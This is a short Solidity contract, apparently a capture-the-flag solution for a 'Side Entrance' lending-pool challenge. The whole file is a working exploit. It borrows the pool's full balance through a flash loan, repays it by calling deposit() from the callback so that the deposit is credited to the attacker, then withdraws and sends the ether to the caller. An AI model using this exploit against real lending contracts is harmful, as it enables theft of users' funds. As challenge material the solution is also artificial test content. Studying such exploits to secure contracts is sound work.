pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface SideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceAttacker {
    using Address for address payable;

    SideEntranceLenderPool lender;

    function attack(SideEntranceLenderPool _lender) external {
        lender = _lender;
        uint256 amount = address(lender).balance;
        lender.flashLoan(amount);
        lender.withdraw();
        msg.sender.sendValue(amount);
    } 

    function execute() external payable {
        lender.deposit{value: msg.value}();
    }

    receive() external payable {
        
    }
}
 